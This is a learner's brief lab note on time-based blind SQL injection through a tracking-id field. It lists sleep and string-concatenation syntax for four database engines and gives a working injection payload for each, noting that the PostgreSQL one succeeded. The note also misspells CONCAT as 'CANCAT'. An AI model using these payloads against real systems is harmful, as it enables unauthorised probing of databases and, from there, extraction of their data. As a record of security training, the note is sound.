Lab 13 - Blind SQL injection with time delays

vulnerable parameter: tracking id

End goals: 
1. To prove that the field is vulnerable to blind SQLi(time based)

Analysis:
Unconditional time delays for 10 seconds in various database:
Oracle: dbms_pipe.receive_message(('a'), 10)
Microsoft: WAITFOR DELAY '0:0:10'
PostgreSQL: SELECT pg_sleep(10)
MySQL: SELECT SLEEP(10)

Concatnate in various database:
Oracle, PostgreSQL: 'foo' || 'bar'
Microsoft: 'foo' + 'bar'
MySQL 'foo' 'bar' (using space) or CANCAT('foo', 'bar')

'  (SELECT SLEEP(10))-- > MySQL
' + (WAITFOR DELAY '0:0:10')-- > Microsoft
' || (SELECT pg_sleep(10))-- > PostgreSQL > success
' || (dbms_pipe.receive_message(('a'), 10))-- > Oracle
